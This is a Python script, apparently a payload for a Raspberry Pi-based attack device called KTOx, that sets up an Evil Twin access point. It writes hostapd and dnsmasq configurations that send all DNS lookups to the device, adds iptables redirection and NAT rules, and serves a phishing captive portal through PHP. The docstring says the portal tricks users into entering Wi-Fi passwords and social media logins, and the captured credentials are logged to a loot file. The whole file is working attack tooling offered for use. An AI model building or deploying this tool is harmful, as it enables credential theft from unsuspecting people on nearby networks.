#!/usr/bin/env python3
import json
"""
KTOx *payload* – **Evil Twin Attack**
========================================
This payload sets up an Evil Twin attack, creating a fake Wi-Fi Access Point
that mimics a legitimate one. It then uses a captive portal to trick users
into providing credentials (e.g., Wi-Fi passwords, social media logins).

Features:
- Scans for nearby Wi-Fi networks to clone their SSID and channel.
- Allows selection of a captive portal template (e.g., generic Wi-Fi login,
  social media phishing pages).
- Sets up `hostapd` for the fake AP, `dnsmasq` for DHCP and DNS spoofing,
  and a PHP web server for the captive portal.
- Monitors connected clients and captured credentials.
- Displays current status, client count, and credential count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, cleaning up all attack services and
  restoring the original network configuration.

Controls:
- MAIN MENU:
    - KEY1: Scan for networks to clone.
    - KEY3: Select captive portal template.
    - OK: Start the Evil Twin attack.
- NETWORK SELECTION:
    - UP/DOWN: Navigate through scanned networks.
    - OK: Select a network to clone.
    - KEY3: Return to main menu.
- PORTAL SELECTION:
    - UP/DOWN: Navigate through available captive portal templates.
    - OK: Select a template.
    - KEY3: Return to main menu.
- ATTACKING SCREEN:
    - OK: Stop the attack.
    - KEY3: Stop attack and exit payload.
"""
import sys
import os
import time
import signal
import subprocess
import threading

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import monitor_mode_helper

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# Prefer installed KTOx path; fallback to repo-relative
PREFERRED_KTOX = '/root/KTOx'
if os.path.isdir(PREFERRED_KTOX):
    if PREFERRED_KTOX not in sys.path:
        sys.path.insert(0, PREFERRED_KTOX)
else:
    KTOX_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'KTOx'))
    if os.path.isdir(KTOX_PATH) and KTOX_PATH not in sys.path:
        sys.path.insert(0, KTOX_PATH)

# ----------------------------
# Third-party library imports 
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("ERROR: Hardware libraries (RPi.GPIO, LCD, PIL) not found.", file=sys.stderr)
    print("Please run 'sudo pip3 install RPi.GPIO spidev Pillow'.", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# KTOx WiFi Integration
# ----------------------------
try:
    from wifi.ktox_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "wlan1" # Fallback

# Load PINS from KTOx gui_conf.json when possible
PINS: dict[str, int] = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": conf_pins.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_UI = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)

KTOX_DIR = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'KTOx'))
CAPTIVE_PORTAL_BASE_PATH = os.path.join(KTOX_DIR, "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "wifi")
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt") # Changed to loot.txt
TEMP_CONF_DIR = "/tmp/ktox_eviltwin/"
# Ensure loot directory exists (for portal writes)
try:
    os.makedirs(os.path.dirname(LOOT_FILE), exist_ok=True)
except Exception:
    pass

WIFI_INTERFACE = get_best_interface()
FAKE_AP_SSID = "Free_WiFi"
FAKE_AP_CHANNEL = "1"


running = True
attack_processes = {}
status_info = {
    "clients": 0,
    "credentials": 0
}
ORIGINAL_WIFI_INTERFACE = None
scroll_offset = 0
VISIBLE_ITEMS = 5 # Number of HTML files visible on screen at once

current_html_file = "wifi"
html_files_list = []
html_file_index = 0

scanned_networks = []
selected_network_index = 0

def run_command(command_parts, error_message, timeout=10, shell=False, check=False):
    try:
        if shell:
            result = subprocess.run(command_parts, shell=True, check=check, capture_output=True, text=True, timeout=timeout)
        else:
            result = subprocess.run(command_parts, shell=False, check=check, capture_output=True, text=True, timeout=timeout)
        if result.stderr:
            print(f"WARNING: {error_message} - STDERR: {result.stderr.strip()}", file=sys.stderr)
        return result.stdout, result.returncode == 0
    except subprocess.CalledProcessError as e:
        print(f"ERROR: {error_message} - Command: {command_parts} - STDERR: {e.stderr.strip()}", file=sys.stderr)
        return e.stdout, False
    except subprocess.TimeoutExpired:
        print(f"ERROR: {error_message} - Command timed out: {command_parts}", file=sys.stderr)
        return "", False
    except FileNotFoundError:
        cmd_name = command_parts[0] if isinstance(command_parts, (list, tuple)) else str(command_parts).split()[0]
        print(f"ERROR: {error_message} - Command not found: {cmd_name}", file=sys.stderr)
        return "", False
    except Exception as e:
        print(f"CRITICAL ERROR during {error_message}: {e}", file=sys.stderr)
        return "", False

def cleanup(*_):
    global running
    if running:
        running = False
        stop_attack()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(lines, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    message_list = lines if isinstance(lines, list) else [lines]
    for line in message_list:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)

    if screen_state == "main":
        d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill=(30, 132, 73))
        d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)

        d.text((5, 30), f"SSID:", font=FONT_UI, fill=(242, 243, 244))
        d.text((5, 45), FAKE_AP_SSID[:16], font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 60), f"Channel:", font=FONT_UI, fill=(242, 243, 244))
        d.text((5, 75), FAKE_AP_CHANNEL, font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 90), f"Portal: {current_html_file}", font=FONT_UI, fill=(242, 243, 244))

        d.text((5, 105), "OK=Start | KEY1=Edit SSID | KEY2=Edit Channel", font=FONT_UI, fill=(171, 178, 185))
        d.text((5, 115), "KEY3=Select Portal", font=FONT_UI, fill=(171, 178, 185))
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill=(212, 172, 13))
        d.line([(0, 22), (128, 22)], fill=(212, 172, 13), width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT_UI, fill="red")
        else:
            # Display scroll indicators if needed
            if scroll_offset > 0:
                d.text((60, 25), "^", font=FONT_UI, fill=(242, 243, 244))
            if scroll_offset + VISIBLE_ITEMS < len(html_files_list):
                d.text((60, 100), "v", font=FONT_UI, fill=(242, 243, 244))

            for i in range(VISIBLE_ITEMS):
                if scroll_offset + i < len(html_files_list):
                    file_name = html_files_list[scroll_offset + i]
                    display_name = file_name
                    if len(display_name) > 16:
                        display_name = display_name[:13] + "..."
                    
                    text_color = "white"
                    if (scroll_offset + i) == html_file_index:
                        text_color = "lime"
                        d.rectangle([(0, 35 + i*15), (128, 35 + (i+1)*15)], fill="blue")
                    d.text((5, 35 + i*15), display_name, font=FONT_UI, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill=(171, 178, 185))
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)

        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill=(242, 243, 244))
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill=(212, 172, 13))
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT_UI, fill="orange")

        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    
    LCD.LCD_ShowImage(img, 0, 0)



def handle_text_input_logic(initial_text, input_type, char_set):
    global FAKE_AP_SSID, FAKE_AP_CHANNEL
    
    current_value = list(initial_text)
    cursor_pos = len(initial_text) - 1

    while running:
        img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {input_type}:", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)

        display_text = list(current_value)
        if cursor_pos < len(display_text):
            display_text[cursor_pos] = '_'
        d.text((5, 40), "".join(display_text[:16]), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.2 # seconds
        current_time = time.time()

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_value:
                new_value = "".join(current_value)
                if input_type == "SSID":
                    FAKE_AP_SSID = new_value
                elif input_type == "Channel":
                    FAKE_AP_CHANNEL = new_value
                return new_value
            else:
                draw_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_value = list(initial_text)
                cursor_pos = len(initial_text) - 1
        
        if btn == "LEFT":
            cursor_pos = max(0, cursor_pos - 1)
        elif btn == "RIGHT":
            cursor_pos = min(len(current_value), cursor_pos + 1)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos < len(current_value):
                char_list = list(current_value)
                current_char = char_list[cursor_pos]
                
                char_set = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\\[]{};:'\",<.>/?`~"
                if input_type == "Channel":
                    char_set = "0123456789"

                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else:
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos] = char_set[char_index]
                    current_value = "".join(char_list)
                except ValueError:
                    current_value = "".join(char_list[:cursor_pos] + [char_set[0]] + char_list[cursor_pos+1:])
            elif cursor_pos == len(current_value):
                if btn == "UP":
                    current_value.append(char_set[0])
                else:
                    if len(current_value) > 0:
                        current_value.pop()
                        cursor_pos = max(0, cursor_pos - 1)
        
        time.sleep(0.05)
    return None

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE, scroll_offset

    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_message(["No portals found!"], "red")
        time.sleep(2)
        return

    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
    
    # Adjust scroll_offset to ensure current_html_file is visible
    if html_file_index < scroll_offset:
        scroll_offset = html_file_index
    elif html_file_index >= scroll_offset + VISIBLE_ITEMS:
        scroll_offset = html_file_index - VISIBLE_ITEMS + 1

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            if html_file_index < scroll_offset:
                scroll_offset = html_file_index
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            if html_file_index >= scroll_offset + VISIBLE_ITEMS:
                scroll_offset = html_file_index - VISIBLE_ITEMS + 1
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
            draw_message([f"Selected:", f"{current_html_file}"], "lime")
            time.sleep(1)
            return
        elif btn == "KEY3":
            return
        
        time.sleep(0.1)

def check_dependencies():
    deps = ["hostapd", "dnsmasq", "php"]
    for dep in deps:
        if subprocess.run(f"which {dep}", shell=True, capture_output=True).returncode != 0:
            return dep
    return None

def stop_interfering_services():
    subprocess.run("pkill wpa_supplicant", shell=True)
    subprocess.run("pkill dnsmasq", shell=True)
    subprocess.run("pkill hostapd", shell=True)
    subprocess.run("pkill php", shell=True)
    time.sleep(2)

def create_configs():
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    hostapd_conf = f"""
interface={WIFI_INTERFACE}
driver=nl80211
ssid={FAKE_AP_SSID}
hw_mode=g
channel={FAKE_AP_CHANNEL}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(hostapd_conf_path, "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    dnsmasq_conf = f"""
interface={WIFI_INTERFACE}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.0.1
address=/#/10.0.0.1
"""
    with open(dnsmasq_conf_path, "w") as f:
        f.write(dnsmasq_conf)
    
    return hostapd_conf_path, dnsmasq_conf_path

def start_attack():
    global attack_processes, ORIGINAL_WIFI_INTERFACE
    
    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
    
    draw_message([f"Activating {WIFI_INTERFACE}...", "Please wait."], "yellow")
    # No longer using set_ktox_interface as WIFI_INTERFACE is hardcoded to wlan1
    # and we are manually configuring it for AP mode.
    
    # Removed nmcli commands as they are not used in working evil twin scripts
    # and can cause conflicts. Relying on pkill wpa_supplicant and direct iwconfig.
    
    stop_interfering_services()
    hostapd_conf, dnsmasq_conf = create_configs()

    if os.path.exists(LOOT_FILE):
        os.remove(LOOT_FILE)

    # Detect upstream (internet-facing) interface dynamically
    upstream = subprocess.run(
        "ip route | grep '^default' | awk '{print $5}'",
        shell=True, capture_output=True, text=True
    ).stdout.strip() or "eth0"

    try:
        subprocess.run(f"ip link set {WIFI_INTERFACE} down", shell=True)
        subprocess.run(f"iw dev {WIFI_INTERFACE} set type ap", shell=True)
        subprocess.run(f"ip addr flush dev {WIFI_INTERFACE}", shell=True)
        subprocess.run(f"ip addr add 10.0.0.1/24 dev {WIFI_INTERFACE}", shell=True)
        subprocess.run(f"ip link set {WIFI_INTERFACE} up", shell=True)

        # Enable IP forwarding
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)

        # Setup iptables for NAT and DNS redirection
        subprocess.run("iptables -F", shell=True, check=True)
        subprocess.run("iptables -t nat -F", shell=True, check=True)
        subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True, check=True)
        subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True, check=True)
        subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o {upstream} -j ACCEPT", shell=True, check=True)
        subprocess.run(f"iptables -t nat -A POSTROUTING -o {upstream} -j MASQUERADE", shell=True, check=True)

        cmd_hostapd = f"hostapd {hostapd_conf}"
        attack_processes['hostapd'] = subprocess.Popen(
            cmd_hostapd, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
            preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['hostapd'].poll() is not None:
            error_msg = attack_processes['hostapd'].stderr.read().decode().strip()
            draw_message(["ERROR:", f"hostapd: {error_msg[:50]}"], "red")
            return False

        # dnsmasq without -d so it daemonises and doesn't block the pipe
        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf}"
        attack_processes['dnsmasq'] = subprocess.Popen(
            cmd_dnsmasq, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid)
        time.sleep(1)
        if attack_processes['dnsmasq'].poll() is not None:
            draw_message(["ERROR:", "dnsmasq failed to start"], "red")
            return False

        cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
        attack_processes['php'] = subprocess.Popen(
            cmd_php, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid)
        time.sleep(1)
        if attack_processes['php'].poll() is not None:
            draw_message(["ERROR:", "PHP server failed to start"], "red")
            return False

        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        draw_message(["ERROR:", f"Setup failed: {str(e)[:50]}"], "red")
        return False

def stop_attack():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    for name, proc in attack_processes.items():
        try:
            os.kill(proc.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    attack_processes.clear()
    
    stop_interfering_services()
    
    # Clear iptables rules and disable IP forwarding
    subprocess.run("iptables -F; iptables -t nat -F", shell=True)
    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

    if ORIGINAL_WIFI_INTERFACE:
        draw_message(["Restoring NM..."], "yellow")
        monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
        time.sleep(1)
        
        subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
        time.sleep(1)
        subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
        time.sleep(5)
        
        subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
        subprocess.run("systemctl start wpa_supplicant 2>/dev/null || true", shell=True) # Restart wpa_supplicant
        time.sleep(5)
        
        WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE
    
    if os.path.exists(TEMP_CONF_DIR):
        subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
                status_info["clients"] = len(f.readlines())
        except FileNotFoundError:
            status_info["clients"] = 0
            
        try:
            with open(LOOT_FILE, "r") as f:
                status_info["credentials"] = len(f.readlines())
        except FileNotFoundError:
            status_info["credentials"] = 0
            
        time.sleep(5)

if __name__ == "__main__":
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), (10, 0, 0))
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    try:
        is_attacking = False
        current_screen = "main"

        dep_missing = check_dependencies()
        if dep_missing:
            draw_message([f"{dep_missing}", "not found!"], "red")
            time.sleep(5)
            raise SystemExit(f"{dep_missing} not found")

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_ssid = handle_text_input_logic(FAKE_AP_SSID, "SSID", " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\\[]{};:'\",<.>/?`~")
                    if new_ssid is not None:
                        FAKE_AP_SSID = new_ssid
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_channel = handle_text_input_logic(FAKE_AP_CHANNEL, "Channel", "0123456789")
                    if new_channel is not None:
                        FAKE_AP_CHANNEL = new_channel
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_screen = "html_select"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    draw_message(["Starting..."])
                    if start_attack():
                        is_attacking = True
                        current_screen = "attacking"
                        threading.Thread(target=monitor_status, daemon=True).start()
                    else:
                        draw_message(["Attack FAILED"], "red")
                        time.sleep(3)
                        current_screen = "main"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            elif current_screen == "html_select":
                handle_file_selection_logic()
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    draw_message(["Stopping..."])
                    cleanup()
                    is_attacking = False
                    current_screen = "main"
                    time.sleep(2)
                elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
            
            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        try:
            with open("/tmp/evil_twin_error.log", "w") as f:
                import traceback
                f.write(f"FATAL ERROR: {type(e).__name__}: {e}\n")
                traceback.print_exc(file=f)
        except Exception:
            pass
        draw_message([f"ERROR:", f"{str(e)[:20]}"], "red")
        time.sleep(3)
    finally:
        cleanup()
        draw_message(["Cleaning up..."])
        time.sleep(2)
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Evil Twin payload finished.")
